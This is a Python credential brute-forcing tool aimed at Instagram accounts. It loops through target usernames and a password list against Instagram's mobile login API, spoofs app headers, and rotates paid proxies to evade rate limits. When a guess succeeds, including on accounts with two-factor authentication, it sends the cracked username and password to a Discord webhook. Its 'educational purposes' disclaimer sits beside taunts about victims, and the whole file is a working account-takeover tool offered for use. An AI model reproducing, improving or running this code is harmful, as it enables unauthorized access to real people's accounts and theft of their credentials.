
from threading import Thread
import requests
from bs4 import BeautifulSoup
import uuid
from colorama import Fore, init
import os
from art import *

os.system('title $React ~ Made for educational purposes only. (Fuck Society)')

def clear():
    os.system('cls')

clear()

def webhook(userBruted, passKey):
    paramsGet = {"wait":"true"}
    rawBody = "{\"content\":null,\"embeds\":[{\"color\":16711680,\"fields\":[{\"name\":\"User Brute Forced\",\"value\":\"@" + userBruted + "\"},{\"name\":\"Password\",\"value\":\"" + passKey + "\"}],\"author\":{\"name\":\"Fuck Society\",\"url\":\"https://discord.dog/282008877753696268\",\"icon_url\":\"https://i.pinimg.com/originals/c6/d0/c1/c6d0c132b45434b4794cee4f2bbafa4a.png\"},\"footer\":{\"text\":\"sjPsycho\",\"icon_url\":\"https://cdn.discordapp.com/emojis/924055212321275934.webp?size=96&quality=lossless\"},\"timestamp\":\"2004-07-30T07:33:00.000Z\"}],\"username\":\"React\",\"avatar_url\":\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHPVXVdrlc6-ueOw9Sd4EnbDyz0r1MFkdhnQ&usqp=CAU\",\"attachments\":[]}"
    headers = {"Origin":"https://discohook.org","Sec-Ch-Ua":"\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"","Accept":"application/json","Sec-Ch-Ua-Platform":"\"Windows\"","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36","Referer":"https://discohook.org/","Sec-Fetch-Site":"cross-site","Sec-Fetch-Dest":"empty","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"cors","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","Content-Type":"application/json"}
    response = session.post(webhookUrl, data=rawBody, params=paramsGet, headers=headers)

def post(targ, passLogin, Proxy):
    global attemptCounter, ifPasswCheckInt
    myUUID = str(uuid.uuid4())

    proxies = {
        'https': Proxy
    }

    paramsPost = {
        "ig_sig_key_version": "5",
        "signed_body": "fa61f4be32e827c7152e38a075e36142d8313ba582d6437f07539b00a03f454e.{\"reg_login\":\"0\",\"password\":\"" + passLogin + "\",\"device_id\":\"" + myUUID + "\",\"username\":\"" + targ + "\",\"adid\":\"FE4FD084-9DCB-481A-A248-57E0E32E25ED\",\"login_attempt_count\":\"0\",\"phone_id\":\"" + myUUID + "\"}"
    }

    headers = {
        "Accept": "*/*", "X-IG-Capabilities": "36r/Vw==",
        "User-Agent": "Instagram 44.0.0.17.95 (iPhone9,3; iOS 12_0; en_US; en-US; scale=2.00; gamut=wide; 750x1334) AppleWebKit/420+",
        "Connection": "close", "X-IG-ABR-Connection-Speed-KBPS": "0", "X-IG-Connection-Speed": "-1kbps",
        "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US;q=1", "X-IG-Connection-Type": "WiFi",
        "X-IG-App-ID": "124024574287414", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    try:
        response = session.post("https://i.instagram.com/api/v1/accounts/login/", data=paramsPost, headers=headers, proxies=proxies, timeout=5)
        lib = response.content.decode('utf-8')

        attemptCounter += 1

        if("logged_in_user" in lib):
            print("[" + Fore.GREEN + "+" + Fore.RESET + "] Bruted this fucking idiot. No 2FA Either lol.")
            webhook(targ, passLogin)
            ifPasswCheckInt += 1
        elif("two_factor_required" in lib):
            print("[" + Fore.YELLOW + "$" + Fore.RESET + "] 2FA On " + targ + " - Successfully Bruted!")
            webhook(targ, passLogin)
            ifPasswCheckInt += 1
        elif("The password you entered is incorrect." in lib):
            print(f'[!] Bruting: {targ}')
            print(f'[$] Password: {passLogin} == Incorrect!')
            ifPasswCheckInt += 1
        elif("AccountHitRateLimit" in lib):
            print("[" + Fore.LIGHTMAGENTA_EX + '%' + Fore.RESET + '] Account Hit Rate Limit, Trying Again.')
            ifPasswCheckInt += 1
        elif("rate_limit_error" in lib):
            print("[" + Fore.LIGHTMAGENTA_EX + '%' + Fore.RESET + '] Account Hit Rate Limit, Trying Again.')
            ifPasswCheckInt += 1
        elif("RleLoginBlocked" in lib):
            print('[' + Fore.LIGHTRED_EX + '&' + Fore.RESET + '] ReLoginBlocked.')
            ifPasswCheckInt += 1
        else:
            print(f'[Error] Log In @{targ} Failed || Response Code: {response.status_code}')
            print(f'[Reason] {response.content} || Password attempt: {passLogin}')
    except Exception as e:
        print(e)
        pass

proxy_list = []
with open('data/proxy.txt') as q:
    proxy = q.readlines()

o = 1
for line in proxy:
    prxy = line.split(':')
    proxy1 = prxy[0]
    port1 = prxy[1]
    username1 = prxy[2]
    password1 = prxy[3]
    password1 = password1.strip('\n')

    Proxys = 'http://' + username1 + ':' + password1 + '@' + proxy1 + ':' + port1
    proxy_list.append(Proxys)
    o += 1

with open ('data/users.txt') as p:
    targets_list = p.read().split('\n')

with open('data/pass.txt') as f:
    passwords = f.read().split('\n')
len = passwords.__len__()

with open('data/webhook.txt') as u:
    webhookUrl = u.readline()

clear()

print('Starting Bruter By sjPsycho || SJ#0008 || Computer Murderers.')
tprint('ig-brute')
print('\n')

print('Press enter to continue...')
input('')
print('\n')

#threads = []
ifPasswCheckInt = 0
attemptCounter = 0
a = 0
r = 0
print()
for passW in passwords:
    for user in targets_list:
        try:

            session = requests.Session()

            post(user, passW, proxy_list[r])
            os.system('title [SJ] R/s: ' + str(attemptCounter) + " // Account #" + str(a))
            a += 1
            r += 1
        except Exception as S:
            print(S)
            continue

# Threading
"""for n in range(int(nWorkers)):
    t = threading.Thread(target=post, args=(user, passwords[i], proxy_list[r]))
    threads.append(t)
    t.start()
for process in threads:
    process.join()"""
